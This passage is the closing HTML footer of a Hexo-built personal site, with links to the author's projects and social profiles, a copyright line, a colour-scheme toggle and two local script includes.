        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
        
        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
        
      </div>
      
      <div class="group">
        <h2 class="title">Me</h2>
        
        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
        
        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
        
        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
        
        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
        
        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
        
      </div>
      
    </div>
    <span>&copy; 2025 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
    
    
      <br>
      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
        <label>
          <input type="radio" value="light">
          <span>Light</span>
        </label>
        <label>
          <input type="radio" value="dark">
          <span>Dark</span>
        </label>
        <label>
          <input type="radio" value="auto">
          <span>Auto</span>
        </label>
      </div>
    
  </div>
</footer>


    
<script src="/js/main.js"></script>


    

    
    
<script src="/js/scroll-reveal.js"></script>

    

    

    

    
  </body>
</html>
